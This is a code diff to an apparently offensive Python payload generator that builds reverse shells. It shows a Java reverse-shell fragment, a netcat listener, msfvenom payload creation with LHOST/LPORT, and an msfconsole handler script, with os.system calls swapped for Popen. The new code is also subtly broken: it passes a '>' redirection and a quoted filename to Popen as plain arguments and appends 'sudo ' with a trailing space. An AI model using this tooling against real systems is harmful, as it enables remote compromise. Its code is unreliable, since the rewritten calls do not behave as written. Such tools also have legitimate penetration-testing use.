@@ -4,6 +4,7 @@ from urllib import request
 from random import choice, sample
 import signal
 import ipaddress
+from subprocess import Popen
 
 import netifaces
 
@@ -169,10 +170,11 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
     print(f'{choice(color)}         |--Shell Spawning--|\n')
     print('For Linux shells use https://github.com/jonasw234/upgrade-tty to upgrade your TTY!\n')
-    sudo_prefix = ''
+    command = []
     if os.geteuid() != 0 and int(port) < 1024:
-        sudo_prefix = 'sudo '
-    os.system(f'{sudo_prefix}nc -lvp {port}')
+        command.append('sudo')
+    command.extend(['nc', '-lvnp', port])
+    Popen(command)
 
 
 def payload():
@@ -254,10 +256,10 @@ def payload():
     if msfpc_format:
         msfpc = subprocess.run(['msfpc', msfpc_format, ipp, port], capture_output=True)
         print(msfpc.stdout.decode('utf-8'))
-        spawn_shell = msfpc.stdout.decode("utf-8").split("Run: ")[1].splitlines()[0]
+        spawn_shell = msfpc.stdout.decode("utf-8").split("Run: ")[1].splitlines()[0].split(' ')
     elif msfvenom_command and msfvenom_extension:
         payload = f'{msfvenom_command.replace("/", "-").replace("_", "-")}-{port}.{msfvenom_extension}'
-        os.system(f'msfvenom -p {msfvenom_command} LHOST={ipp} LPORT={port}{msfvenom_extra} > "{payload}"')
+        Popen(['msfvenom', '-p', msfvenom_command, f'LHOST={ipp}', f'LPORT={port}', msfvenom_extra, '>', f'"{payload}"'])
         print(f'Payload created: {os.getcwd()}/{payload}')
         msfvenom_rc = f'{msfvenom_command.replace("/", "-").replace("_", "-")}-{port}-{msfvenom_extension}.rc'
         with open(msfvenom_rc, 'w') as rc:
@@ -272,17 +274,18 @@ set ExitOnSession false
 set EnableStageEncoding true
 #set AutoRunScript 'post/windows/manage/migrate'
 run -j""")
-        spawn_shell = f'msfconsole -q -r {os.getcwd()}/{msfvenom_rc}'
+        spawn_shell = ['msfconsole', '-q', '-r', f'{os.getcwd()}/{msfvenom_rc}']
         print('')
     else:
         print('Something went wrong and I don’t know what to do ...')
         sys.exit(1)
 
     print(f'{choice(color)}         |--Shell Spawning--|\n')
-    sudo_prefix = ''
+    command = []
     if os.geteuid() != 0 and int(port) < 1024:
-        sudo_prefix = 'sudo '
-    os.system(f'{sudo_prefix}{spawn_shell}')
+        command.append('sudo ')
+    command.extend(spawn_shell)
+    Popen(command)
 
 
 def banner():
